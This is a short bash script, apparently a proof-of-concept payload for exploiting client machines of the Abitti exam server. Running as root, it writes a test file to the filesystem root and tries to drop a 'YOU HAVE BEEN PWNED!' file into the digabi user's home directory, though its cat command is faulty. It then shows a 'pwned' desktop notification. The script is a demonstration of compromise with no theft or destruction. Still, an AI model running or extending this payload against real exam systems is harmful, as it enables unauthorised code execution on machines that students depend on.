#!/bin/bash

# EXPLOITING CLIENTS OF ABITTI SERVER


touch /test_write_to_root

cat "YOU HAVE BEEN PWNED!" >> /home/digabi/pwned.txt

export DISPLAY=:0

sudo -u digabi notify-send "ABITTI HAS BEEN PWNED!"
